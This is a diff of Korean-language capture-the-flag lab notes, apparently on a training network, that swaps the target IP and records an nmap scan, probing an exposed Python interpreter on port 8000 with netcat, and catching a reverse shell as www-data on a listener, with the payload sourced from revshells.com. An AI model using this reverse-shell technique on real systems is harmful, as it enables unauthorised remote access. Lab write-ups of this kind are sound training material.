@@ -1,13 +1,13 @@
-10.10.234.59
+10.10.249.130
 
-# nmap -Pn -sC -sV -T4 10.10.234.59 -oN nmap.txt --open -sS -> 22, 8000
+# nmap -Pn -sC -sV -T4 10.10.249.130 -oN nmap.txt --open -sS -> 22, 8000
 
 ┌──(root㉿docker-desktop)-[/]
-└─# nmap -Pn -sC -sV -T4 10.10.234.59 -oN nmap.txt --open -sS
+└─# nmap -Pn -sC -sV -T4 10.10.249.130 -oN nmap.txt --open -sS
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 13:56 UTC
 Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 50.00% done; ETC: 13:57 (0:00:39 remaining)
-Nmap scan report for 10.10.234.59
+Nmap scan report for 10.10.249.130
 Host is up (0.28s latency).
 Not shown: 920 closed tcp ports (reset), 78 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -57,24 +57,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 193.67 seconds
 
-# http 10.10.234.59/ -> 페이지 탐색 불가
+# http 10.10.249.130/ -> 페이지 탐색 불가
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http 10.10.234.59/
+└─# http 10.10.249.130/
 
-http: error: ConnectionError: HTTPConnectionPool(host='10.10.234.59', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffffd8d6f90>: Failed to establish a new connection: [Errno 111] Connection refused')) while doing a GET request to URL: http://10.10.234.59/
+http: error: ConnectionError: HTTPConnectionPool(host='10.10.249.130', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffffd8d6f90>: Failed to establish a new connection: [Errno 111] Connection refused')) while doing a GET request to URL: http://10.10.249.130/
 
-# nc 10.10.234.59 8000
+# nc 10.10.249.130 8000
 
 ┌──(root㉿docker-desktop)-[/]
-└─# nc 10.10.234.59 8000
+└─# nc 10.10.249.130 8000
 ls
 name 'ls' is not defined
 
 # 명령어 실행 되는 것 확인
 
 (root㉿docker-desktop)-[/]
-└─# nc 10.10.234.59 8000
+└─# nc 10.10.249.130 8000
 print(1)
 name 'ᅦprint' is not defined
 ^[[D^[[A^[[A
@@ -85,7 +85,7 @@ whoami
 name 'whoami' is not defined
 id
 
-# 10.10.234.59:8000에서 Python 인터프리터가 실행 중
+# 10.10.249.130:8000에서 Python 인터프리터가 실행 중
 
 ls, whoami 등은 쉘 명령어라서 작동하지 않음
 print(1+1) → 2가 나온 것으로 Python 환경임을 확인
@@ -95,7 +95,7 @@ print(1+1) → 2가 나온 것으로 Python 환경임을 확인
 (root㉿docker-desktop)-[/]
 └─# nc -lvnp 4444
 listening on [any] 4444 ...
-connect to [10.8.136.212] from (UNKNOWN) [10.10.234.59] 40290
+connect to [10.8.136.212] from (UNKNOWN) [10.10.249.130] 40290
 bash: /root/.bashrc: Permission denied
 www-data@ip-10-10-234-59:~$ ls  
 ㅣls
@@ -116,3 +116,5 @@ Try: apt install <deb name>
 www-data@ip-10-10-234-59:~$
 
 # 공격대상 컴퓨터 (파이썬 인터프리터) https://www.revshells.com/ 검색해서 실행
+
+# www-data 권한으로 시작
